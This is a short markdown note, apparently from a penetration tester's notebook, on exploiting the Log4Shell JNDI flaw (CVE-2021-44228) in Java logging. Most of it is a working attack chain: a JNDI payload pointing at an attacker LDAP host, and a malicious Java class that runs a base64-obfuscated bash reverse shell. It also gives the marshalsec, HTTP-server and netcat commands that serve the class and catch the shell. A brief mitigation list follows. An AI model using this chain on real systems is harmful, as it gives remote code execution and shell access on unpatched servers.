# jndi-remote-execution

**Author:** Julien Bongars\
**Date:** 2025-09-24 18:56:50
**Path:**

---

JNDI lookups (Log4Shell / CVE-2021-44228) can load a remote Java class when user input is interpolated into a log message.

## Vulnerable pattern

```java
// Vulnerable logging patterns
logger.info("User login attempt: " + userInput);
logger.error("Invalid request from: " + clientData);
logger.warn("Processing failed for: " + formData);
```

## Payload

```json
{
  "username": "admin",
  "password": "password",
  "remember": "${jndi:ldap://attacker-server.com:1389/Exploit}"
}
```

## Malicious class

```java
public class Exploit {
    static {
        try {
            // Reverse shell payload
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {
            // Handle silently
        }
    }
}
```

## LDAP and listener

```bash
# Start malicious LDAP server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker-ip:8000/#Exploit"

# Serve malicious Java class
python3 -m http.server 8000

# Listen for reverse shell
nc -lvnp 4444
```

## Mitigation

- Update Log4j to version 2.17.0+
- Set system property: `log4j2.formatMsgNoLookups=true`
- Input validation and sanitization
- Network segmentation to prevent outbound LDAP connections

## Resources

- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html) — patched versions
- [Censys: CVE-2021-44228 Log4j](https://censys.com/blog/cve-2021-44228-log4j) — attack surface notes
